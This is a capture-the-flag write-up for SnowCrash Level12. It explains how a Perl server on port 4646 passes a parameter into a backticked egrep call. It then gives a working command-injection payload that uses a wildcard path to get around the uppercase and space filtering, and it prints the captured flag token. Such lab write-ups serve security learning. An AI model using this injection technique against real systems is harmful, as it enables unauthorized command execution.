# Level12


This `perl` script is a server listening on port `4646`. 
There are two parameters `x` and `y`. `x` parameter is modified and used.  

Each char of this parameter is uppercased using [binding operator](https://perldoc.perl.org/perlop#Binding-Operators). The parameter is also split when a space is find.  
For example: `x="hello world"`
After the changement, x will be: `HELLO`

```perl
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
```

We have this line in which a grep is execute to get line in `/tmp/xd`. If the line match with `x` it's return in `output`.  

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

So we can try to close the backtip to execute our command/script.  
So the payload will be:  

```bash
curl 127.0.0.1:4646?x='`OURSCRIPT`'
```
We must close the backtip and open-it after our command/script.  

Because space and lower char are modified we must write a script file with our script.
Using of `wildcard` is required because of the directory in which we can write is `tmp`, a name with only lower case.  

```bash
level12@SnowCrash:~$ echo "/bin/getflag | wall" > /tmp/SCRIPT
level12@SnowCrash:~$ chmod a+x /tmp/SCRIPT
level12@SnowCrash:~$ curl 127.0.0.1:4646?x='`/*/SCRIPT`'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 7:27 ...                                                
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
